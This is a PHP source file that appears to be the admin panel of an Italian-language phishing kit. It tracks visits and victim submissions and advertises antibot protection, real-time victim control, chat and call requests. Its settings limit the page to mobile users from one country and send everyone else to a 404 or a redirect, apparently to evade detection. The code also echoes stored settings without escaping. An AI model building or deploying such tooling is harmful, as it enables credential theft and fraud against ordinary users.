<?php /* 1hnn6b5XTp5GzmgWJxRbXtWhgUYJvZKjPtYzJ3zqLQQj */
include ("sec.php");
include ("datistat.php");
if (isset($_POST['salva']))
{
  if (isset($_POST['bloccastato']))
  {
      $bloccastato = true;
  }
  else
  {
      $bloccastato = false;
  }


    if (isset($_POST['solomobile']))
    {
        $solomobile = true;
    }
    else
    {
        $solomobile = false;
    }
    if (isset($_POST['soloandroid']))
    {
        $soloandroid = true;
    }
    else
    {
        $soloandroid = false;
    }
    if (isset($_POST['redirect']))
    {
        $redirect = $_POST['redirect'];
    }
    else
    {
        $redirect = false;
    }
    if (isset($_POST['codicechat']))
    {
        $codicechat = $_POST['codicechat'];
    }
    else
    {
        $codicechat = false;
    }
    if (isset($_POST['codicestat']))
    {
        $codicestat = $_POST['codicestat'];
    }
    else
    {
        $codicestat = false;
    }
    if (isset($_POST['crippa']))
    {
        $crippa = true;
    }
    else
    {
        $crippa = false;
    }
    $opt = array(
        "solomobile" => $solomobile,
        "soloandroid" => $soloandroid,
        "redirect" => $redirect,
        
        "crippa"=>$crippa,
        "codicestat" => $codicestat,
        "bloccastato" => $bloccastato,
        "codicechat" => $codicechat
    );
    $out = json_encode($opt);
    file_put_contents('opzioni.json', $out);
    $messsalva = "SALVATO";
}
else
{
    $messsalva = "";
}
include ("leggi.php"); ?>
<?php include("layout1.php") ?>
<?php if(nomecartella2()=="pannello3"){ ?>
  <p style="padding:20px;text-align:center;BORDER: 7PX SOLID #ffffff;background-color: white;color: darkred;font-size: 15px;"><a class="btn btn-warning" href="cambianome.php">CAMBIA NOME AL PANNELLO</a><a class="btn btn-danger" href="cambia.php">CAMBIA PASSWORD</a><br><br><b>
PER LA TUA SICUREZZA CAMBIA SEMPRE LA PASSWORD ATTUALE DI DEFAULT 123 E IL NOME DEL PANNELLO.<br></b>
</p>

<?php } ?><br>
<div class="container" STYLE="text-align:center">
  <div class="row">
    <div class="col-sm">
    <H5>  VISITE</H5>
    </div>
    <div class="col-sm">
      <H5 style="font-weight:bold" ><?php echo $visite ?></H5>
    </div>
    <div class="col-sm">
    <H5>  INSERIMENTI</H5>
    </div>
    <div class="col-sm">
      <H5  style="font-weight:bold" ><?php echo $inserimenti ?></H5>
    </div>
    <div class="col-sm">
    <H5>  FATTI</H5>
    </div>
    <div class="col-sm">
      <H5 style="font-weight:bold" ><?php echo $fatti ?></H5>
    </div>

  </div>
<HR>
  


</div>

<div class="container" STYLE="text-align:center">
<div class="col-sm"><canvas id="gauge" ></canvas> </div>

 <div class="col-sm">
        <H5 style="font-weight:bold" >Performance</H5>
          <H5 style="font-weight:bold" ><?php echo $rapporto ?>%</H5>
    </div>
</div><HR><p style="padding:20px;text-align:center">
Con Antibot - Blocco per dispositivo e Nazione - Stato Online - Controllo in tempo reale (UADMIN) - Chat - Richiesta Chiamata
</p>
<HR>
<DIV style="padding:20px;text-align:center">
<form method="POST"> <div class="form-group">
<BR>
<a class="btn btn-warning" href="cambianome.php">CAMBIA NOME AL PANNELLO</a>

<a class="btn btn-danger" href="cambia.php">CAMBIA PASSWORD</a><BR><BR>

<?php $statoscelto= file_get_contents("stato.txt"); ?>
<?php


function getUserIP2()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
    {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif (filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
 $miostato = "N.D";
$ip = getUserIP2();
 $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    if(isset($details) && isset($details->country)){ 
$miostato = $details->country;
}
      ?>
<?php if($messsalva){?><div class="alert alert-success salvato"><?php echo $messsalva ?></div><?php } ?>
<label>PERMETTI LA VISUALIZZAZIONE DELLA PAGINA SOLO DISPOSITIVI MOBILI</label>
<input  class="form-control"  type="checkbox" <?php if($opt['solomobile']) echo "checked" ?> name="solomobile">
<BR>
<label>PERMETTI LA VISUALIZZAZIONE SOLO IP PROVENIENTI DA STATO "<?php echo  $statoscelto ?>"</label>
<BR><P>IL TUO STATO ATTUALE DA CUI STAI VISITANDO è <?php echo $miostato  ?>
<input  class="form-control"  type="checkbox" <?php if($opt['bloccastato']) echo "checked" ?> name="bloccastato">
<BR>
<label>PERMETTI LA VISUALIZZAZIONE DELLA PAGINA SOLO AGLI ANDROID E IPHONE</label><input  class="form-control"  type="checkbox"  <?php if($opt['soloandroid']) echo "checked" ?>  name="soloandroid">
<BR>
<label>CRIPTA LA PAGINA (SPERIMENTALE)</label>
<input  class="form-control"  type="checkbox" <?php if($opt['crippa']) echo "checked" ?> name="crippa">
<BR>

<label>REDIRECT SU LINK (SE VUOTO MOSTRA 404)</label><input  class="form-control"  type="url" name="redirect" value="<?php echo $opt['redirect'] ?>">
<BR><label>CODICE CHAT <a href="https://www.smartsupp.com/it/">SMARTSUPP</a></label><input  class="form-control"  type="text" name="codicechat" value="<?php echo $opt['codicechat'] ?>">
<BR>
<BR><label>CODICE  <a href="https://whos.amung.us/">whos.amung.us</a></label><input  class="form-control"  
type="text" name="codicestat" value="<?php if(isset($opt['codicestat'])) { echo $opt['codicestat']; } ?>">
<BR>
</div>
<button type="submit" class="btn btn-primary" name="salva">SALVA</button>
</form>
</div>
<script>
var opts = {
  angle: -0.01, 
  lineWidth: 0.3, 
  radiusScale: 0.96, 
  pointer: {
    length: 0.59, 
    strokeWidth: 0.049, // The thickness
    color: '#000000' // Fill color
  },
  limitMax: false,    
  limitMin: false,     // If true, the min value of the gauge will be fixed
  colorStart: '#6FADCF',   // Colors
  colorStop: '#8FC0DA',    // just experiment with them
  strokeColor: '#E0E0E0',  // to see which ones work best for you
  generateGradient: true,
  highDpiSupport: true,     // High resolution support
  
};
var target = document.getElementById('gauge'); // your canvas element
var gauge = new Gauge(target).setOptions(opts); // create sexy gauge!
gauge.maxValue = 100; // set max gauge value
gauge.setMinValue(0);  // Prefer setter over gauge.minValue = 0
gauge.animationSpeed = 38; // set animation speed (32 is default value)
gauge.set(<?php echo $rapporto ?>); // set actual value

	window.setTimeout(function () {
 // window.location.reload();
}, 15000);
window.setTimeout(function () {
 jQuery(".salvato").remove()
}, 3000);
</script>
<?php include("layout2.php") ?><?php  ?>